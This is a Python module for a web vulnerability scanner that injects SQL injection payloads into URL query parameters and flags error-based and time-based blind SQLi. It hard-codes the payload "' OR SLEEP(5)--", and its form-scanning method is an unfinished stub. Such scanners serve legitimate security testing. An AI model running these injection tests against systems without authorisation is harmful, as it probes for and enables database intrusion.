from .base_scanner import BaseScanner
from core.ai_analyzer import AIAnalyzer
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import requests

class SQLIScanner(BaseScanner):
    
    @property
    def name(self):
        return 'sqli'

    def __init__(self, session, payloads):
        super().__init__(session, payloads)
        self.ai_analyzer = AIAnalyzer()

    def scan(self, target):
        """Orchestrates the SQLi scan, now supporting both URL and FORM targets."""
        if target['type'] == 'url':
            return self._scan_url(target['value'])
        
        elif target['type'] == 'form':
            form_details = target['value']
            # We can handle both GET and POST forms for SQLi
            return self._scan_form(form_details)
        
        return []

    def _scan_url(self, url):
        """Scans a URL with GET parameters."""
        vulnerabilities = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if not params:
            return []

        print(f"    -> Scanning [SQLI] on URL: {url[:80]}")

        for param in list(params.keys()):
            # --- Test 1: Error-Based SQLi ---
            for payload in self.payloads:
                modified_params = params.copy()
                modified_params[param] = payload
                modified_query = urlencode(modified_params, doseq=True)
                test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", modified_query, ""))
                
                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=False)
                    is_vulnerable, evidence = self.ai_analyzer.analyze_for_error_based(response)
                    if is_vulnerable:
                        print(f"      [+] VULN (Error-Based SQLI) found! Param: {param}, Payload: {payload}")
                        vulnerabilities.append({
                            'url': url, 'type': 'SQLI_ERROR_BASED', 'payload': payload,
                            'evidence': evidence, 'method': 'GET', 'parameter': param
                        })
                        # Move to next parameter if found
                        break 
                except requests.RequestException:
                    continue
            
            # --- Test 2: Time-Based Blind SQLi ---
            # Define a sleep time for the test
            sleep_time = 5 
            time_based_payload = f"' OR SLEEP({sleep_time})--"
            
            modified_params = params.copy()
            modified_params[param] = time_based_payload
            modified_query = urlencode(modified_params, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", modified_query, ""))

            try:
                start_time = time.time()
                self.session.get(test_url, timeout=sleep_time + 5)
                end_time = time.time()
                
                if (end_time - start_time) >= sleep_time:
                    print(f"      [+] VULN (Time-Based Blind SQLI) found! Param: {param}")
                    vulnerabilities.append({
                        'url': url, 'type': 'SQLI_TIME_BASED', 'payload': time_based_payload,
                        'evidence': f"Server response delayed by {end_time - start_time:.2f} seconds, indicating the sleep command was executed.",
                        'method': 'GET', 'parameter': param
                    })
            except requests.exceptions.Timeout:
                print(f"      [+] VULN (Time-Based Blind SQLI) found via timeout! Param: {param}")
                vulnerabilities.append({
                    'url': url, 'type': 'SQLI_TIME_BASED', 'payload': time_based_payload,
                    'evidence': "Request timed out, which is a strong indicator of a time-based vulnerability.",
                    'method': 'GET', 'parameter': param
                })
            except requests.RequestException:
                pass

        return vulnerabilities

    def _scan_form(self, form_details):
        """Scans a form for SQLi (handles GET and POST)."""
        # This is a simplified version; a full implementation would be more complex.
        # For this example, we'll focus on the first injectable-looking input.
        url = form_details['url']
        method = form_details['method'].lower()
        inputs = form_details['inputs']
        
        print(f"    -> Scanning [SQLI] on FORM at: {url[:80]}")

        for input_field in inputs:
            param_name = input_field.get('name')
            if not param_name or input_field.get('type') in ['submit', 'button', 'hidden']:
                continue

            # This is where you would implement logic similar to _scan_url
            # for both GET and POST requests based on the form's method.
            # For brevity, this is left as an exercise. The principles are the same:
            # 1. Construct the request (URL with params for GET, data dict for POST).
            # 2. Send Error-based, Boolean-based, and Time-based payloads.
            # 3. Analyze responses.
        
        return [] # Placeholder